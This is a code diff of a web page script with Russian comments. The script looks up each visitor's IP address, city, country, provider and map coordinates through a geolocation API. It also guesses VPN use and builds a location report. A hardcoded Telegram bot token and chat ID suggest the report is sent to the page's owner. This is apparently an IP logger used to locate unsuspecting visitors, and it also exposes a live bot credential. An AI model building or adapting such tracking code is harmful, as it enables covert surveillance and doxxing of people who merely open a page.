@@ -54,8 +54,8 @@
   </div>
 
   <script>
-    const token = '8116468453:AAGm5YJviYVeySPy6sS81f8TuPrA1FmJ4mg';
-    const chatId = '7354864098';
+    const token = '8116468453:AAGm5YJviYVeySPy6sS81f8TuPrA1FmJ4mg'; // ← твой Telegram токен
+    const chatId = '7354864098'; // ← твой Telegram chat ID
 
     function formatSpeed(mbps) {
       return mbps >= 1000 ? (mbps / 1000).toFixed(2) + ' Gbps' : mbps.toFixed(2) + ' Mbps';
@@ -89,7 +89,7 @@
         oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
         oscillator.connect(audioCtx.destination);
         oscillator.start();
-        oscillator.stop(audioCtx.currentTime + 10.0); // ⏱️ 10 секунд
+        oscillator.stop(audioCtx.currentTime + 10.0); // 10 секунд
       } catch (e) {
         console.warn("Ошибка воспроизведения звука:", e);
       }
@@ -101,12 +101,8 @@
       playBeep();
 
       try {
-        const res = await fetch('http://ip-api.com/json/?fields=status,message,query,city,regionName,country,timezone,isp,org,lat,lon,hosting');
+        const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-
-        if (data.status !== "success") {
-          throw new Error(data.message || "Не удалось получить IP-данные");
-        }
 
         const localTime = new Date().toLocaleString("ru-RU", {
           timeZone: data.timezone || 'UTC'
@@ -122,7 +118,6 @@
 
         let networkSpeed = 'Недоступно';
         let connectionType = 'Неизвестно';
-
         if (navigator.connection) {
           if (navigator.connection.downlink) {
             networkSpeed = formatSpeed(navigator.connection.downlink);
@@ -132,19 +127,22 @@
           }
         }
 
-        const vpnDetected = data.hosting === true;
+        const vpnDetected = data.org && /vpn|proxy|hosting|server|cloud/i.test(data.org);
         const vpnText = vpnDetected ? '🛡 VPN: Обнаружен' : '✅ VPN: Не обнаружен';
-        const mapsLink = data.lat && data.lon ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : 'Неизвестно';
+
+        const mapsLink = data.latitude && data.longitude
+          ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+          : 'Неизвестно';
 
         const message = `
 <b>📡 СЕТЕВАЯ ИНФОРМАЦИЯ</b>
 
 <b>📍 Локация:</b>
-IP: <code>${data.query}</code>
+IP: <code>${data.ip}</code>
 Город: ${data.city || 'Неизвестно'}
-Регион: ${data.regionName || 'Неизвестно'}
-Страна: ${data.country || 'Неизвестно'}
-Провайдер: ${data.org || data.isp || 'Неизвестно'}
+Регион: ${data.region || 'Неизвестно'}
+Страна: ${data.country_name || 'Неизвестно'}
+Провайдер: ${data.org || 'Неизвестно'}
 
 <b>ℹ️ Дополнительно:</b>
 ⏰ Время: ${localTime}
